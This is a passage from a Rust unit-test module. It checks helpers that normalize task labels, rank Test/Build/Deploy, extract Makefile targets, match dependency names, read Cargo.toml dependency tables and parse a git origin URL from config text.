        assert_eq!(normalize_label("db:migrate"), "Migrate");
        assert_eq!(normalize_label("storybook"), "Storybook");
    }

    #[test]
    fn ordering_puts_test_first() {
        assert!(order_rank("Test") < order_rank("Build"));
        assert!(order_rank("Build") < order_rank("Deploy"));
    }

    #[test]
    fn makefile_targets_are_extracted() {
        let mk = "\
.PHONY: build test\n\
VAR := x\n\
build: ## build it\n\
\tcargo build\n\
test:\n\
\tcargo test\n\
clean:\n\
\trm -rf dist\n";
        let targets = parse_makefile(mk);
        assert_eq!(targets, vec!["build", "test", "clean"]);
    }

    #[test]
    fn word_present_respects_boundaries() {
        assert!(word_present("django==4.2", "django"));
        assert!(!word_present("pytorch", "torch"));
        assert!(word_present("torch>=2.0", "torch"));
    }

    #[test]
    fn cargo_dep_names_reads_tables() {
        let toml = "\
[package]\n\
name = \"x\"\n\
[dependencies]\n\
tokio = { version = \"1\", features = [\"full\"] }\n\
serde.workspace = true\n\
[dependencies.axum]\n\
version = \"0.7\"\n";
        let deps = cargo_dep_names(toml);
        assert!(deps.contains("tokio"));
        assert!(deps.contains("serde"));
        assert!(deps.contains("axum"));
        assert!(!deps.contains("name"));
    }

    #[test]
    fn parse_origin_url_extracts_origin_only() {
        let cfg = "\
[core]\n\
\trepositoryformatversion = 0\n\
[remote \"origin\"]\n\
\turl = git@github.com:me/repo.git\n\
\tfetch = +refs/heads/*:refs/remotes/origin/*\n";
        assert_eq!(
            parse_origin_url(cfg).as_deref(),
            Some("git@github.com:me/repo.git")
        );
        let no_origin = "[core]\n\tbare = false\n";
        assert_eq!(parse_origin_url(no_origin), None);
    }
}
